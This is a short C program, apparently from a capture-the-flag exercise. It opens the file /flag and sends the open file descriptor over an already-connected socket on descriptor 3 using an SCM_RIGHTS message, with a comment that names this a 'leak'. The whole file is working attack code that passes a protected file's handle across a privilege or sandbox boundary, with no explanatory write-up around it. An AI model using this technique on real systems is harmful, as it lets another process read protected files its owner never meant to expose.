#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/un.h>

#define SOCKET_PATH "./socket_path"
#define FLAG_FILE "/flag"

int main(int argc, char *argv[]) {
    int sfd = 3, flag_fd;
    struct sockaddr_un addr;
    struct msghdr msg = {0};
    struct iovec iov[1];
    char control_buf[CMSG_SPACE(sizeof(int))];  // Buffer for SCM_RIGHTS
    char data_buf[] = "Sending FD";             // Dummy data required for sendmsg

    // Open the file we want to "leak"
    flag_fd = open(FLAG_FILE, O_RDONLY);
    if (flag_fd < 0) {
        perror("[Server] open");
        return 1;
    }
    printf("[Server] Opened flag file. FD: %d\n", flag_fd);
    // Setup iovec
    iov[0].iov_base = data_buf;
    iov[0].iov_len = sizeof(data_buf);

    // Setup msghdr
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;
    msg.msg_control = control_buf;
    msg.msg_controllen = sizeof(control_buf);

    // Setup cmsghdr to use SCM_RIGHTS
    struct cmsghdr *cmsg;
    cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    *((int *)CMSG_DATA(cmsg)) = flag_fd; // Attach the file descriptor

    msg.msg_controllen = cmsg->cmsg_len;

    // Send the message with the FD inside the ancillary data
    printf("[Server] Sending flag FD %d via sendmsg...\n", flag_fd);
    if (sendmsg(sfd, &msg, 0) == -1) {
        perror("[Server] sendmsg");
        close(sfd);
        close(flag_fd);
        return 1;
    }

    printf("[Server] Successfully sent file descriptor.\n");
    close(sfd);
    close(flag_fd);
    return 0;
}